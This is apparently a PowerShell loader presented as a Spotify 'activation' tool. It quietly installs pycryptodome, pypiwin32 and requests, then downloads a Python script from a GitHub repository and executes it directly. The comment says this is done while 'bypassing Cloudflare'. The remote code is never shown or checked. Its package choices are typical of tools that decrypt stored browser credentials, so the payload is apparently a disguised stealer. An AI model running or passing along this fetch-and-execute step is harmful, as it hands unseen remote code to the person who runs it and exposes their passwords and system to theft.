# [1] Check for Python
try {
    $null = python --version 2>&1
} catch {
    Write-Host "⚠️ Install Python first: https://python.org"
    exit
}

# [2] Install required packages
python -m pip install --upgrade pip --quiet
python -m pip install pycryptodome pypiwin32 requests --quiet --no-warn-script-location

# [3] Execute Python script from GitHub (bypassing Cloudflare)
$pythonScriptUrl = "https://raw.githubusercontent.com/QUADROisCoding/EZ_ACTIVATE/main/Spotify_version.py"
$pythonCode = (Invoke-WebRequest $pythonScriptUrl -UseBasicParsing).Content
python -c $pythonCode
